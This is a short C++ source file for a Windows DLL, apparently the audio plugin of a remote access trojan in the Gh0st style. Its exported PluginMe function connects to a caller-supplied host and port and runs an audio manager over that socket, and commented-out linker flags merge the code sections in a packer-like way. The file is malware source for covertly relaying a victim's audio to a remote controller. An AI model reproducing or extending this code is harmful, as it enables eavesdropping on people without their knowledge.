// MyAudio.cpp : Defines the entry point for the DLL application.
//

//#pragma comment(linker,"/opt:nowin98")
//#pragma comment(linker,"/subsystem:windows /ENTRY:mymain /opt:nowin98 /FILEALIGN:0x200 /MERGE:.data=.text /MERGE:.rdata=.text /MERGE:.CRT=.text /SECTION:.text,EWR /IGNORE:4078")
#include "StdAfx.h"
#include "ClientSocket.h"
#include "MyAudioManager.h"

extern "C" __declspec(dllexport) BOOL PluginMe(LPCSTR lpszHost, UINT nPort, LPBYTE lpBuffer)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(lpszHost, nPort))
		return -1;

	CMyAudioManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

BOOL APIENTRY mymain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	return TRUE;
}

